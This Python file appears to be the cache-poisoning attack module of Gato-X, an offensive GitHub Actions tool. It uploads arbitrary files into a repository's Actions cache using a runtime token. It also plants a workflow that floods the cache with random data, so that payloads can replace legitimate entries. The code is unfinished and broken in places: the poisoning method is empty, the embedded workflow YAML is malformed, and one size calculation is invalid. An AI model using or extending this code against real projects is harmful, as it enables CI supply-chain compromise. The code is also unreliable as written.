"""
Copyright 2024, Adnan Khan

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""

import os
import requests
import random
import string

from gatox.github.api import Api

class CachePoison:
    """Gato-X Attack module for GitHub Action cache poisoning.
    The class implements features to:

    * Fill the cache with random data up to a user-specified number of GBs.
    * Create a cache poisoning payload `.tzstd` file.
    * Set the payload to a set of cache keys specified by the user.

    """

    CACHE_STUFFER = """
name: Get Cache Keys
on: workflow_dispatch
  inputs:
    cache_url:
      required: true
      type: string
    auth_token:
      required: true
      type: string
    size:
      required: true
      type: number
    

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
      with:
        ref: main
        repo: AdnaneKhan/ActionsCacheBlasting
    - name: Stuffer
      run: |
        for i in {1..${{ inputs.size }}}
        do
            dd if=/dev/urandom of=newfile bs=10M count=30
            python3 CacheUpload.py --auth-token ${{ inputs.auth_token }} --cache-url ${{ inputs.cache_url }} --key ${{ }} --version ${{ }} --file-path newfile
        done
"""

    def __init__(self, api_wrapper: Api, cache_url: str, runtime_token: str):
        """Constructor for cache poisoning attack.
        """
        self.api = api_wrapper  
        self.cache_url_full = f"{cache_url}/_apis/artifactcache/caches"

        self.headers = {
            'accept': 'application/json;api-version=6.0-preview.1',
            'content-type': 'application/json',
            'user-agent': 'actions/cache',
            'Authorization': f'Bearer {runtime_token}',
        }


    def __create_stuffing_repository(self):
        """Creates a new repository for the purpose of stuffing the cache via GitHub Actions workflow.
        """
        random_name = ''.join(random.choices(string.ascii_letters, k=10))

        # Create public repository in the user's personal account.
        status = self.api.create_repository(random_name)

        if status.status_code == 204:

            # Create a file in the repository that will stuff the cache
            self.api.commit_file(random_name, 'main', '/.github/workflows/cache_stuffer.yml', file_content=self.CACHE_STUFFER)
        
            return random_name
        else:
            return None

    def __get_presigned_url(self, key: str, version: str):
        """
        """
        data = {
            "key": key,
            "version": version,
            # This isn't checked, just need a valid number.
            "cacheSize": 1337
        }

        response = requests.post(self.cache_url_full, headers=self.headers, json=data)

        if response.status_code == 201:
            cache_id = response.json()['cacheId']
            return cache_id
        else:
            return False

    def __upload_file(self, cache_id, file_path: str):
        """Upload a file using the cache ID.
        """
        upload_file = open(file_path, 'rb') 
        try:
            patch_headers = {
            "Content-Type": "application/octet-stream",
            "Content-Range": f"bytes 0-{len(os.path.getsize(upload_file)) -1}/*"
            }
            patch_headers.update(self.headers)

            patch_response = requests.patch(self.cache_url_full + '/' + str(cache_id), headers=patch_headers, data=upload_file.read())

            if patch_response.status_code == 204:
                file_size = os.path.getsize(file_path)
                size_data = {
                    "size": file_size
                }
                post_response = requests.post(self.cache_url_full + '/' + str(cache_id), headers=self.headers, json=size_data)

            else:
                return False
        except Exception as e:
            return False
        finally:
            upload_file.close()


    def stuff_cache(self, size: int):
        """
        """

        repo_name = self.__create_stuffing_repository()

        # Issue the workflow dispatch event

        # Wait for the cache to be stuffed (poll workflow every so often)

        dispatch_params = {
            'size': (size * 1000) // 300,
            'cache_url': '',
            'auth_token': ''
        }

        self.api.issue_dispatch(repo_name, 'cache_stuffer.yml', 'main', input=dispatch_params)

        # Get ID for workflow

        # Monitor for workflow completion




        # Make sure that the PAT has the delete repo scope before calling this.
        self.api.delete_repository(repo_name)



    def poison_cache(self, keys: list):
        """
        """

        #.__upload_file(cache_id, file_path)
    

